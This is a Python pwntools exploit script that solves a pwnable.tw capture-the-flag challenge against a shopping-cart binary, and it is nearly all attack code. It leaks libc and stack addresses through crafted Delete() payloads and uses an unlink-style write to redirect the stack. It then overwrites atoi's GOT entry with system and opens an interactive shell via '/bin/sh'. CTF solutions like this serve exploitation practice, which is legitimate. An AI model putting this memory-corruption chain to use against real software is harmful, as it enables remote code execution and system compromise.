atoiPLT = 0x08048560
atoiGOT = 0x804b040

atoi_offset = 0x2d050
system_offset = 0x3a940
binsh_offset = 0x158e8b

from pwn import *

# tomcr00se rooted the galaxy S5, but we need you to jailbreak the iPhone8!
p = remote('chall.pwnable.tw', '10104')

elf = ELF('./vuln')
libc = ELF('./libc_32.so.6')
# p = elf.process()

# gdb.attach(p, '''b *delete+171''')

def Add(item):
	p.sendlineafter(b'> ', b'2')
	p.sendlineafter(b'> ', item)

def Delete(item):
	p.sendlineafter(b'> ', b'3')
	p.sendlineafter(b'> ', item)

def Cart(item):
	p.sendlineafter(b'> ', b'4')
	p.sendlineafter(b'> ', item)

def Checkout():
	p.sendlineafter(b'> ', b'5')
	p.sendlineafter(b'> ', b'y')

# pass checkout => get iphone 8 allocated in stack
for i in range(20):
	Add(b'2')

for i in range(6):
	Add(b'1')

# get iphone 8 - 1$
Checkout()

# leak libc address
payload = b'27' + p32(atoiGOT) + p32(0) * 3
Delete(payload)
p.recvuntil(b'27:')
atoi_libc = u32((p.recvuntil(b' ')[:4]))
libc_base = atoi_libc - atoi_offset
system_libc = libc_base + system_offset
binsh_libc = libc_base + binsh_offset

log.success('Addr atoi: ' + hex(atoi_libc))
log.success('Addr Libc base: ' + hex(libc_base))
log.success('Addr system: ' + hex(system_libc))
log.success('Addr "/bin/sh": ' + hex(binsh_libc))

# leak stack address
# p &environ
environ_offset = 0x1b1dbc
environ_addr = libc_base + environ_offset
log.success('Addr &environ: ' + hex(environ_addr))

payload = b'27' + p32(environ_addr) + p32(0) * 3
Delete(payload)
p.recvuntil(b'27:')
environ_address = u32((p.recvuntil(b' ')[:4]))
ebp_address = environ_address - 0x104
log.success('Addr EBP - Delete() function: ' + hex(ebp_address))


# # write ebp to atoi+0x22 use struct PRODUCT fd, bk
log.info('===== Used struct PRODUCT: fd, bk and func Delete() => overwrite =====')
payload = b'27' + p32(0) * 2 + p32(atoiGOT+0x22) + p32(ebp_address-0x8)
Delete(payload)

# Set the atoi got to system addr, and excute the system('/bin/sh')

payload = p32(system_libc) + b';/bin/sh;'
p.sendlineafter('> ', payload)

p.interactive()






